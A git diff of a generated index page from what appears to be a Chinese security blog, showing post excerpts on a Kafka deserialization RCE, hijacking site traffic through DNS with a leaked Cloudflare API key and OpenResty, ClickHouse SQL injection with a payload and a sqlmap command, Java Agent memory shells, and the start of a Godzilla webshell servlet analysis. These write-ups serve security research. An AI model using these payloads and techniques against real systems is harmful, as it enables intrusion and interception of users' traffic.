+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>pom.xml文件：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3>
+	
+	</div>
+  <a type="button" href="/2023/02/14/kafka-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/02/13/cname-hijack-openresty.html" >利用OpenResty进行域名流量劫持</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-02-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先可以通过API接口查看泄漏的key是否生效：</p>
+<h4 id="查看Zones"><a href="#查看Zones" class="headerlink" title="查看Zones"></a>查看Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看Zones对应的DNS记录"><a href="#查看Zones对应的DNS记录" class="headerlink" title="查看Zones对应的DNS记录"></a>查看Zones对应的DNS记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看审计日志"><a href="#查看审计日志" class="headerlink" title="查看审计日志"></a>查看审计日志</h4><p>获取最近的登陆日志、操作日志、客户端IP等：</p>
+	
+
+	</div>
+  <a type="button" href="/2023/02/13/cname-hijack-openresty.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先可以通过API接口查看泄漏的key是否生效：</p>
+<h4 id="查看Zones"><a href="#查看Zones" class="headerlink" title="查看Zones"></a>查看Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看Zones对应的DNS记录"><a href="#查看Zones对应的DNS记录" class="headerlink" title="查看Zones对应的DNS记录"></a>查看Zones对应的DNS记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="查看审计日志"><a href="#查看审计日志" class="headerlink" title="查看审计日志"></a>查看审计日志</h4><p>获取最近的登陆日志、操作日志、客户端IP等：</p>
+	
+	</div>
+  <a type="button" href="/2023/02/13/cname-hijack-openresty.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/01/16/pay_vuln.html" >支付接口安全测试记录</a>
 		</h3>
 		</div>
@@ -160,510 +562,6 @@
 	
 	</div>
   <a type="button" href="/2023/01/16/pay_vuln.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2022/11/08/pve_homelab.html" >PVE使用注意事项</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-11-08  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>组建的PVE使用的是这个方案: <a target="_blank" rel="noopener" href="https://foxi.buduanwang.vip/virtualization/1183.html/">PVE+TrueNAS+ZFS+10G内网方案</a></p>
-<h2 id="虚拟机磁盘选择"><a href="#虚拟机磁盘选择" class="headerlink" title="虚拟机磁盘选择"></a>虚拟机磁盘选择</h2><p>使用的时候创建的Windows虚拟机特别慢，打开管理器一看磁盘最高只有5M/S的写入速度，发现是选择的磁盘类型不同，在创建虚拟机的时候最好选择<a target="_blank" rel="noopener" href="https://foxi.buduanwang.vip/virtualization/pve/1214.html/">SCSI的磁盘格式</a></p>
-<p>比如在新建Windows虚拟机的时候，一般需要以下<a target="_blank" rel="noopener" href="https://www.dudr.top/index.php/archives/121/">步骤</a>：</p>
-<ol>
-<li>下载<a target="_blank" rel="noopener" href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso">VirtIO驱动镜像</a></li>
-<li>将镜像文件上传到 PVE 的 ISO镜像中</li>
-<li>按照常规流程创建虚拟机，不启动</li>
-<li>在虚拟机的 “硬件” 选项卡内添加 “CD/DVD驱动器”</li>
-<li>挂载 win10 系统镜像和 VirtIO 驱动镜像 (CD1: win10.iso，CD2: virtio-win.iso)</li>
-<li>检查虚拟机的 “选项” 选项卡内的 “引导顺序</li>
-<li>启动虚拟机 &gt; “加载驱动程序” &gt; “浏览” D:\amd64\win10 &gt; “下一步”，安装驱动程序</li>
-<li>驱动安装后在磁盘列表就会检测到硬盘，继续后续系统安装步骤</li>
-</ol>
-<p>但是我现在已经装好了虚拟机，需要把IDE类型的磁盘转换为SCSI：</p>
-<ol>
-<li>已有的虚拟机插入两个ISO设备，一个是Win10镜像，一个是Virto镜像</li>
-<li>开机启动进入Win10镜像，然后<code>SHIFT+F10</code>调出cmd</li>
-<li>确定C盘的盘符和Virto的盘符，输入命令<code>dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64</code></li>
-<li>随后关机: <code>wpeutil shutdown -s</code></li>
-<li>在PVE虚拟机界面分离磁盘，把磁盘类型改为SCSI，随后重启即可</li>
-</ol>
-<p><img src="/2022/11/08/pve_homelab/1.png"></p>
-<p>改完之后的写入速度在40M/S～50M/S左右</p>
-<h2 id="数据的备份和关机顺序"><a href="#数据的备份和关机顺序" class="headerlink" title="数据的备份和关机顺序"></a>数据的备份和关机顺序</h2>
-	
-
-	</div>
-  <a type="button" href="/2022/11/08/pve_homelab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>组建的PVE使用的是这个方案: <a target="_blank" rel="noopener" href="https://foxi.buduanwang.vip/virtualization/1183.html/">PVE+TrueNAS+ZFS+10G内网方案</a></p>
-<h2 id="虚拟机磁盘选择"><a href="#虚拟机磁盘选择" class="headerlink" title="虚拟机磁盘选择"></a>虚拟机磁盘选择</h2><p>使用的时候创建的Windows虚拟机特别慢，打开管理器一看磁盘最高只有5M/S的写入速度，发现是选择的磁盘类型不同，在创建虚拟机的时候最好选择<a target="_blank" rel="noopener" href="https://foxi.buduanwang.vip/virtualization/pve/1214.html/">SCSI的磁盘格式</a></p>
-<p>比如在新建Windows虚拟机的时候，一般需要以下<a target="_blank" rel="noopener" href="https://www.dudr.top/index.php/archives/121/">步骤</a>：</p>
-<ol>
-<li>下载<a target="_blank" rel="noopener" href="https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/latest-virtio/virtio-win.iso">VirtIO驱动镜像</a></li>
-<li>将镜像文件上传到 PVE 的 ISO镜像中</li>
-<li>按照常规流程创建虚拟机，不启动</li>
-<li>在虚拟机的 “硬件” 选项卡内添加 “CD/DVD驱动器”</li>
-<li>挂载 win10 系统镜像和 VirtIO 驱动镜像 (CD1: win10.iso，CD2: virtio-win.iso)</li>
-<li>检查虚拟机的 “选项” 选项卡内的 “引导顺序</li>
-<li>启动虚拟机 &gt; “加载驱动程序” &gt; “浏览” D:\amd64\win10 &gt; “下一步”，安装驱动程序</li>
-<li>驱动安装后在磁盘列表就会检测到硬盘，继续后续系统安装步骤</li>
-</ol>
-<p>但是我现在已经装好了虚拟机，需要把IDE类型的磁盘转换为SCSI：</p>
-<ol>
-<li>已有的虚拟机插入两个ISO设备，一个是Win10镜像，一个是Virto镜像</li>
-<li>开机启动进入Win10镜像，然后<code>SHIFT+F10</code>调出cmd</li>
-<li>确定C盘的盘符和Virto的盘符，输入命令<code>dism /image:C:\ /add-driver /driver:E:\vioscsi\w10\amd64</code></li>
-<li>随后关机: <code>wpeutil shutdown -s</code></li>
-<li>在PVE虚拟机界面分离磁盘，把磁盘类型改为SCSI，随后重启即可</li>
-</ol>
-<p><img src="/2022/11/08/pve_homelab/1.png"></p>
-<p>改完之后的写入速度在40M/S～50M/S左右</p>
-<h2 id="数据的备份和关机顺序"><a href="#数据的备份和关机顺序" class="headerlink" title="数据的备份和关机顺序"></a>数据的备份和关机顺序</h2>
-	
-	</div>
-  <a type="button" href="/2022/11/08/pve_homelab.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2022/10/27/clickhouse-sql-inject.html" >ClickHouse注入测试记录</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-10-27  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>根据源代码发现可以利用<code>&#39;)</code>拼接闭合SQL语句之后，插入要注入的Payload，比如：<code>1&#39;)and sleep(3) and (&#39;1</code>，可以休眠3S。经过测试发现存在以下限制：</p>
-<ul>
-<li>sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回</li>
-<li>sleep关键词不能使用大写，因为clickhouse函数大小写敏感</li>
-<li>无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库</li>
-</ul>
-<p>虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，<del>可能这就是脚本小子吧</del></p>
-<p>经过我不懈努力，终于让Sqlmap跑出来了可注入点:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlmap.py -r ~/Desktop/sql.txt -v --technique<span class="token operator">=</span>T --level <span class="token number">3</span> -v <span class="token number">3</span> --dbms MySQL --time-sec <span class="token number">3</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"and ('"</span> --tamper lowercase --proxy http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/10/27/clickhouse-sql-inject/1.png"></p>
-<p>为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的<code>SLEEP(5)</code>是自带的payload，就算是加了<code>--tamper lowercase</code>也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：</p>
-<ol>
-<li>写个Burp插件转变成小写–费时费力</li>
-<li>修改Sqlmap的源代码–这个简单</li>
-</ol>
-<p>于是乎，我直接编辑sqlmap目录下的<code>data/xml/payloads/time_blind.xml</code>，直接把<code>SLEEP</code>替换为<code>sleep</code>，然后发现会影响<code>SLEEPTIME</code>这个变量，再替换一次<code>sleepTime</code>为<code>SLEEPTIME</code>。</p>
-	
-
-	</div>
-  <a type="button" href="/2022/10/27/clickhouse-sql-inject.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="前期尝试"><a href="#前期尝试" class="headerlink" title="前期尝试"></a>前期尝试</h2><p>根据源代码发现可以利用<code>&#39;)</code>拼接闭合SQL语句之后，插入要注入的Payload，比如：<code>1&#39;)and sleep(3) and (&#39;1</code>，可以休眠3S。经过测试发现存在以下限制：</p>
-<ul>
-<li>sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回</li>
-<li>sleep关键词不能使用大写，因为clickhouse函数大小写敏感</li>
-<li>无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库</li>
-</ul>
-<p>虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，<del>可能这就是脚本小子吧</del></p>
-<p>经过我不懈努力，终于让Sqlmap跑出来了可注入点:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlmap.py -r ~/Desktop/sql.txt -v --technique<span class="token operator">=</span>T --level <span class="token number">3</span> -v <span class="token number">3</span> --dbms MySQL --time-sec <span class="token number">3</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"and ('"</span> --tamper lowercase --proxy http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/10/27/clickhouse-sql-inject/1.png"></p>
-<p>为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的<code>SLEEP(5)</code>是自带的payload，就算是加了<code>--tamper lowercase</code>也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：</p>
-<ol>
-<li>写个Burp插件转变成小写–费时费力</li>
-<li>修改Sqlmap的源代码–这个简单</li>
-</ol>
-<p>于是乎，我直接编辑sqlmap目录下的<code>data/xml/payloads/time_blind.xml</code>，直接把<code>SLEEP</code>替换为<code>sleep</code>，然后发现会影响<code>SLEEPTIME</code>这个变量，再替换一次<code>sleepTime</code>为<code>SLEEPTIME</code>。</p>
-	
-	</div>
-  <a type="button" href="/2022/10/27/clickhouse-sql-inject.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2022/06/23/java-agent-shell.html" >Java安全笔记(4)-Java Agent</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-06-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="学习背景"><a href="#学习背景" class="headerlink" title="学习背景"></a>学习背景</h2><p><img src="/2022/06/23/java-agent-shell/1.png"></p>
-<ol>
-<li>Agent本来就在学习的清单上</li>
-<li>更深入理解下草师傅说的代理模式</li>
-<li>study the world</li>
-</ol>
-<h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>AOP为Aspect Oriented Programming的缩写，意为: 面向切面编程，在运行时，动态地将代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。<br>以下引用来自su18和天下大木头师傅的博客：</p>
-<blockquote>
-<p>JDK 1.5 开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。</p>
-</blockquote>
-<blockquote>
-<p>开发者可以在一个普通Java程序（带有main函数的Java类）运行时，通过<code>–javaagent</code>参数指定一个特定的jar文件(包含Instrumentation代理)来启动Instrumentation的代理程序。在类的字节码载入jvm前会调用ClassFileTransformer的transform方法，从而实现修改原类方法的功能，实现AOP。</p>
-</blockquote>
-<p>通过java.lang.instrument实现的工具我们称之为Java Agent，Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，Agent内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。</p>
-<p>说白了Java Agent只是一个Java类而已，只不过普通的Java类是以main函数作为入口点的，Java Agent的入口点则是premain和agentmain</p>
-<p>Java Agent 支持两种方式进行加载：</p>
-	
-
-	</div>
-  <a type="button" href="/2022/06/23/java-agent-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="学习背景"><a href="#学习背景" class="headerlink" title="学习背景"></a>学习背景</h2><p><img src="/2022/06/23/java-agent-shell/1.png"></p>
-<ol>
-<li>Agent本来就在学习的清单上</li>
-<li>更深入理解下草师傅说的代理模式</li>
-<li>study the world</li>
-</ol>
-<h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>AOP为Aspect Oriented Programming的缩写，意为: 面向切面编程，在运行时，动态地将代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。<br>以下引用来自su18和天下大木头师傅的博客：</p>
-<blockquote>
-<p>JDK 1.5 开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。</p>
-</blockquote>
-<blockquote>
-<p>开发者可以在一个普通Java程序（带有main函数的Java类）运行时，通过<code>–javaagent</code>参数指定一个特定的jar文件(包含Instrumentation代理)来启动Instrumentation的代理程序。在类的字节码载入jvm前会调用ClassFileTransformer的transform方法，从而实现修改原类方法的功能，实现AOP。</p>
-</blockquote>
-<p>通过java.lang.instrument实现的工具我们称之为Java Agent，Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，Agent内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。</p>
-<p>说白了Java Agent只是一个Java类而已，只不过普通的Java类是以main函数作为入口点的，Java Agent的入口点则是premain和agentmain</p>
-<p>Java Agent 支持两种方式进行加载：</p>
-	
-	</div>
-  <a type="button" href="/2022/06/23/java-agent-shell.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2022/05/17/godzilla.html" >哥斯拉原理分析</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2022-05-17  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="分析背景"><a href="#分析背景" class="headerlink" title="分析背景"></a>分析背景</h2><p>起源于<code>Y4er</code>师傅发的两篇文章：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li>
-<li><a target="_blank" rel="noopener" href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li>
-</ul>
-<p>对其中的原因比较好奇，所以尝试对哥斯拉做了一次原理分析，测试代码在<a target="_blank" rel="noopener" href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>。文章可能有错误的地方，可以在<a target="_blank" rel="noopener" href="https://github.com/JKme/JKme.github.io/issues">issue</a>留言。</p>
-<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>从哥斯拉的源代码里面扣出来<code>godzilla\shells\payloads\java\assets\payload.classs</code>文件，使用<a target="_blank" rel="noopener" href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>反编译之后，在idea里面新建<code>payload.java</code>文件，然后修改误报错，<a target="_blank" rel="noopener" href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">这里</a>是反编译好之后的文件。<code>payload.java</code>实现了大部分的shell操作，比如查看文件、执行命令、数据库连接等等</p>
-<p>新建一个<code>HelloServlet.java</code>，用于动态调试：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
-
-<span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
-    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//定义AES加解密的Key，哥斯拉会把返回的response也做一次加密</span>
-    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>       
-    <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//用于返回response在头和尾部插入标识符，头部取md5的前16位字符串，尾部取md5的后16位字符串</span>
-    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>
-            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
